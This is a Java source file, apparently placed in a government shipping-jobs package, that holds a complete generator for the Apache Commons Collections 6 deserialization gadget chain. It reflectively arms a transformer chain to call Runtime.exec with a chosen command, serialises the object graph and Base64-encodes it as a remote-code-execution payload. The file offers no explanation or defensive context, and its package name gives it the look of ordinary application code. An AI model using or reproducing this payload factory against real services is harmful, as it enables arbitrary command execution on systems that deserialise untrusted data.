package gov.sca.fulfillment.shipping.jobs;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

final class CommonsCollections6PayloadFactory {
    private CommonsCollections6PayloadFactory() {
    }

    static String encode(String command) throws Exception {
        Transformer inert = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});
        Map lazy = LazyMap.decorate(new HashMap(), inert);
        TiedMapEntry entry = new TiedMapEntry(lazy, "shipment");
        Map<Object, Object> graph = new HashMap<>();
        graph.put(entry, "queued");
        lazy.remove("shipment");

        Transformer[] armed = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{command}),
                new ConstantTransformer(1)
        };
        Field transformers = ChainedTransformer.class.getDeclaredField("iTransformers");
        transformers.setAccessible(true);
        transformers.set(inert, armed);

        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        try (ObjectOutputStream output = new ObjectOutputStream(bytes)) {
            output.writeObject(graph);
        }
        return Base64.getEncoder().encodeToString(bytes.toByteArray());
    }
}
